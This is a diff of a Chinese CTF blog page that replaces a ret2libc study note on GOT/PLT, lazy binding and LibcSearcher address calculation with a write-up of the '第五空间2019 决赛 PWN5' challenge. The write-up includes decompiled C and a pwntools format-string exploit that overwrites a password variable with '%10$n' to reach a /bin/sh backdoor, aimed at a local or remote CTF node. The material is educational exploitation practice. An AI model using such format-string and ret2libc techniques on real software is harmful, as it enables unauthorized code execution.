@@ -157,7 +157,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [PWN]ret2libc学习笔记
+                                [第五空间2019 决赛]PWN5
                             </h1>
                             
                                 <!--en-->
@@ -167,17 +167,15 @@
                                         「配枪朱丽叶 - 分部。」
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2021-07-06</a>
+                                Date: <a href="#">2021-07-25</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">5.5
+                                    href="#">1.2
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">1503</a></span>
+                                    <span class="post-words">words:<a href="#">207</a></span>
                                     
                                         <span class="post-category">
                                 Category:
-                                
-                                <a href="https://shawr00t.github.io/XtLkpctuU/">学习笔记</a>
                                 
                                 <a href="https://shawr00t.github.io/HdcmhNKsB/">pwn</a>
                                 
@@ -188,90 +186,66 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>参考天正师傅的博客学习了下^^。</p>
-<blockquote>
-<p>ret2libc这种攻击方式主要是针对动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve() 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。</p>
-</blockquote>
-<p><strong>Q：什么是动态链接？</strong></p>
-<ul>
-<li>动态链接是指在程序装载时通过动态链接器将程序所需的所有动态链接(Dynamic linking library) 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），当程序运行时才将他们链接在一起形成一个完整程序的过程。</li>
-<li>它诞生的最主要的的原因就是静态链接太过于浪费内存和磁盘的空间，并且现在的软件开发都是模块化开发，不同的模块都是由不同的厂家开发，在静态链接的情况下，一旦其中某一模块发生改变就会导致整个软件都需要重新编译，而通过动态链接的方式就推迟这个链接过程到了程序运行时进行。</li>
-<li>动态链接的程序在运行时会根据自己所依赖的动态链接库，通过动态链接器将他们加载至内存中，并在此时将他们链接成一个完整的程序。Linux系统中，ELF动态链接文件被称为动态共享对象（Dynamic Shared Objects），简称共享对象。一般都是以 “.so” 为扩展名的文件，在pwn中我们常称之为libc库；在windows系统中就是常常软件报错缺少xxx.dll文件。</li>
-</ul>
-<p><strong>Q：什么是GOT表和PLT表？</strong></p>
-<ul>
-<li>GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。</li>
-<li>PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。</li>
-<li>打个比方，我发布文章把别人的段落复制到我的文章里就是静态链接，做一个超链接需要点击就属于动态链接。PLT是超链接本身，GOT是超链接中的内容。</li>
-</ul>
-<p><strong>Q：延迟绑定的基本原理？</strong></p>
-<ul>
-<li>假如存在一个puts函数，这个函数在PLT中的条目为puts@plt，在GOT中的条目为puts@got，那么在第一次调用puts函数的时候，首先会跳转到PLT表，伪代码如下：</li>
-</ul>
-<pre><code>puts@plt:
-    jmp puts@got
-    patch puts@got
-</code></pre>
-<ul>
-<li>这里会从PLT跳转到GOT，如果函数从来没有调用过，那么这时候GOT会跳转回PLT并调用patch puts@got，这一行代码的作用是将puts函数真正的地址填充到puts@got，然后跳转到puts函数真正的地址执行代码。当我们下次再调用puts函数的时候，执行路径就是先后跳转到puts@plt、puts@got、puts真正的地址。</li>
-<li><em>也就是说，PLT表和GOT表是一一对应的，GOT表中存的是函数的实际地址，而PLT表中存的是函数GOT表的地址。另外，PLT、GOT之类的地址是固定的。</em></li>
-<li>延时绑定是只有动态库函数在被调用时，才会地址解析和重定位工作。ret2libc需要构造两次payload。</li>
-</ul>
-<p>Ret2libc题目的特点如下：</p>
-<ul>
-<li>
-<p>在做题的时候，会给两个文件。一个是elf程序文件，另一个则是libc库文件。不过有的题目也不会给出libc库，需要我们根据函数在libc库中的偏移量来查找对应的libc库。</p>
-</li>
-<li>
-<p>程序中不会有<code>system()</code>或者<code>bin</code>字符串。</p>
-</li>
-<li>
-<p>NX一般也是关闭的，没有RWX（读取、写入、执行）的位置。</p>
-</li>
-<li>
-<p>考虑动态链接的情况，libc库中有<code>system()</code>和<code>binsh</code>字符串。</p>
-</li>
-<li>
-<p>由于ASLR（地址随机化），每次运行libc的位置都会有变动（一般题目默认开启ALSR）。</p>
-</li>
-<li>
-<p>函数地址、字符串地址、gadgets（程序中存在的程序小片段）地址不知道。</p>
-</li>
-<li>
-<p>由于按页分配，libc地址<strong>一定</strong>是<code>000</code>结尾。<code>ldd+程序</code>查看libc地址。<br>
-<img src="https://imgpp.com/images/2021/07/06/2021-07-06_151002.png" alt="2021-07-06_151002.png" loading="lazy"></p>
-</li>
-<li>
-<p>不同版本的libc中，函数的偏移基本不同。虽然libc的位置在变动，但是装载时是一个整体，内部的偏移不变。例如，<code>system()</code>距libc起始地址不变（已知）、read函数距离libc起始地址不变（已知），<code>system()</code>和<code>read()</code>之间的距离不变。如果<code>read()</code>的真实地址已知，就可以计算出<code>system()</code>的真实地址。</p>
-</li>
-</ul>
-<p><strong>Q：确定libc的两种方法？</strong></p>
-<ul>
-<li>方法一：在线寻找libc。（在线查询：https://libc.nullbyte.cat/）<br>
-不同版本的libc中函数的偏移基本不同。gbd调试，run程序后，<code>ctrl</code>+<code>c</code>中断程序，使用p（print）查看函数地址，再次run，对比<code>system</code>和<code>read</code>函数的地址。<br>
-<img src="https://imgpp.com/images/2021/07/06/2021-07-06_151711.png" alt="2021-07-06_151711.png" loading="lazy"><br>
-通过低3位可判断使用的libc版本，并得到其他函数的偏移。<br>
-<img src="https://imgpp.com/images/2021/07/06/2021-07-06_151847.png" alt="2021-07-06_151847.png" loading="lazy"><br>
-点击匹配的版本，可以看到指定函数和其他函数的位置偏移，减掉“Difference”的地址差就可以得到想要的函数的地址：<br>
-<img src="https://imgpp.com/images/2021/07/06/2021-07-06_152242.png" alt="2021-07-06_152242.png" loading="lazy"></li>
-<li>方法二：使用LibcSearcher（线下无网络时常用）</li>
-</ul>
-<pre><code>git clone https://hub.fastgit.org/lieanu/LibcSearcher.git
-cd LibSearcher
-sudo python setup.py develop
-</code></pre>
-<p>简单的使用示例</p>
-<pre><code class="language-python">from LibcSearcher import *
+                            <p>main函数如下：</p>
+<pre><code class="language-c">int __cdecl main(int a1)
+{
+  unsigned int v1; // eax
+  int fd; // ST14_4
+  int result; // eax
+  int v4; // ecx
+  unsigned int v5; // et1
+  char nptr; // [esp+4h] [ebp-80h]
+  char buf; // [esp+14h] [ebp-70h]
+  unsigned int v8; // [esp+78h] [ebp-Ch]
+  int *v9; // [esp+7Ch] [ebp-8h]
 
-#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型
-obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90)
-libcbase = 0X7ff39014bd90 - obj.dump(&quot;puts&quot;)         #基址
-obj.dump(&quot;system&quot;)        #system 偏移
-obj.dump(&quot;str_bin_sh&quot;)        #/bin/sh 偏移
-system_addr = libcbase + obj.dump(&quot;system&quot;)         #system实际地址
-bin_sh_addr = libcbase+obj.dump(&quot;str_bin_sh&quot;)          #/bin/sh实际地址
+  v9 = &amp;a1;
+  v8 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  v1 = time(0);
+  srand(v1);
+  fd = open(&quot;/dev/urandom&quot;, 0);
+  read(fd, &amp;unk_804C044, 4u);
+  printf(&quot;your name:&quot;);
+  read(0, &amp;buf, 0x63u);
+  printf(&quot;Hello,&quot;);
+  printf(&amp;buf);
+  printf(&quot;your passwd:&quot;);
+  read(0, &amp;nptr, 0xFu);
+  if ( atoi(&amp;nptr) == unk_804C044 )
+  {
+    puts(&quot;ok!!&quot;);
+    system(&quot;/bin/sh&quot;);
+  }
+  else
+  {
+    puts(&quot;fail&quot;);
+  }
+  result = 0;
+  v5 = __readgsdword(0x14u);
+  v4 = v5 ^ v8;
+  if ( v5 != v8 )
+    sub_80493D0(v4);
+  return result;
+}
 </code></pre>
-<p>使用时出现报错：<a href="https://www.jianshu.com/p/a8b3ed1792fa">解决方法</a></p>
+<p>可以看到printf存在格式化字符串漏洞<br>
+<img src="https://imgpp.com/images/2021/07/25/2021-07-25_223957.png" alt="1.png" loading="lazy"><br>
+将<code>0x804C044</code>覆盖为4，然后输入4即可进入后门。</p>
+<pre><code class="language-python">from pwn import *
+
+local = 1
+if local == 1:
+    io = process('./pwn')
+else:
+    io = remote('node4.buuoj.cn',26740)
+
+payload = p32(0x804c044)+&quot;%10$n&quot;
+io.recvuntil(&quot;name:&quot;)
+io.sendline(payload)
+
+io.interactive()
+</code></pre>
 
                         </div>
                         
@@ -286,7 +260,7 @@ bin_sh_addr = libcbase+obj.dump(&quot;str_bin_sh&quot;)          #/bin/sh实际�
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://shawr00t.github.io/ctfshowpwn03/">https://shawr00t.github.io/ctfshowpwn03/</a></span>
+                                                <span><a href="https://shawr00t.github.io/di-wu-kong-jian-2019-jue-sai-pwn5/">https://shawr00t.github.io/di-wu-kong-jian-2019-jue-sai-pwn5/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -301,9 +275,9 @@ bin_sh_addr = libcbase+obj.dump(&quot;str_bin_sh&quot;)          #/bin/sh实际�
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/ctfshowpwn03/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/ctfshowpwn03/&sharesource=qzone&title=[PWN]ret2libc学习笔记&pics=https://shawr00t.github.io/images/avatar.png?v=1627225218702&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/ctfshowpwn03/&sharesource=weibo&title=[PWN]ret2libc学习笔记 + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1627225218702 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/di-wu-kong-jian-2019-jue-sai-pwn5/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/di-wu-kong-jian-2019-jue-sai-pwn5/&sharesource=qzone&title=[第五空间2019 决赛]PWN5&pics=https://shawr00t.github.io/images/avatar.png?v=1627225218702&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/di-wu-kong-jian-2019-jue-sai-pwn5/&sharesource=weibo&title=[第五空间2019 决赛]PWN5 + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1627225218702 "><i class="fa fa-weibo "></i></a>
                                                         
                                                             <div class="reward ">
                                                                 <div class="reward-button ">&yen;
@@ -321,10 +295,6 @@ bin_sh_addr = libcbase+obj.dump(&quot;str_bin_sh&quot;)          #/bin/sh实际�
                                                                         <span class="tag ">
                         
                         
-                        <a href="https://shawr00t.github.io/XtLkpctuU/">#
-                                                学习笔记
-                                                    </a>
-                                                    
                         <a href="https://shawr00t.github.io/HdcmhNKsB/">#
                                                 pwn
                                                     </a>
@@ -342,13 +312,9 @@ bin_sh_addr = libcbase+obj.dump(&quot;str_bin_sh&quot;)          #/bin/sh实际�
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/xmanpwn-level1/">
-                                                                                            [XMAN]pwn level1   
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/ctfshow01-zhan-yi-chu-zhi-ret2text/">
-                                                                                                    [CTFshow]01栈溢出之ret2text
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/buuctfget_started_3dsctf_2016/">
+                                                                                                    [BUUCTF]get_started_3dsctf_2016
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
